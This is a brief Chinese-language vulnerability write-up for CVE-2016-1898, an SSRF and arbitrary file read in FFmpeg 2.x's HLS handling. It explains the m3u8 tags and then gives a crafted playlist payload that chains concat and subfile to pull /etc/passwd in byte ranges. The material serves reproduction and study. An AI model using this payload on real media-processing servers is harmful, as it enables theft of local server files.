<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-1898）Ffmpeg 任意文件读取漏洞</h1><h2>一、漏洞简介</h2><p>CVE-2016-1898可以读取文件任意行</p><ul><li>#EXTM3U 标签是m3u8的文件头，开头必须要这一行</li><li>#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒</li><li>#EXT-X-VERSION:2 该标签可有可无</li><li>#EXTINF:6, 表示该一段TS流文件的长度</li><li>#EXT-X-ENDLIST 这个相当于文件结束符</li></ul><h2>二、漏洞影响</h2><p>FFmpeg 2.x</p><h2>三、复现过程</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(https://www.0-sec.org/ffmpeg-protocols.html#subfile )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p><p>#EXTM3U<br />#EXT-X-MEDIA-SEQUENCE:0<br />#EXTINF:10.0,<br />concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,64,end,128,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,128,end,256,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,256,end,512,,:///etc/passwd<br />#EXT-X-ENDLIST</p></body></html>